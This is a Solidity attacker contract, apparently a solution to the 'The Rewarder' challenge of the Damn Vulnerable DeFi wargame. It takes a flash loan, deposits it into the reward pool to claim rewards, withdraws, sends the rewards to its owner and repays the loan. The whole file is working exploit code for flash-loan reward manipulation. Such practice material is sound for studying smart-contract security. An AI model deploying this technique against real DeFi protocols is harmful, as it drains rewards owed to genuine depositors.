pragma solidity ^0.6.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    FlashLoanerPool pool;
    TheRewarderPool rewarder;
    DamnValuableToken token;
    RewardToken rewardToken;

    address owner;

    constructor(address _pool, address _rewarder) public {
        pool = FlashLoanerPool(_pool);
        rewarder = TheRewarderPool(_rewarder);
        token = DamnValuableToken(pool.liquidityToken());
        rewardToken = RewardToken(rewarder.rewardToken());
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        token.transfer(address(pool), amount);
    }
}
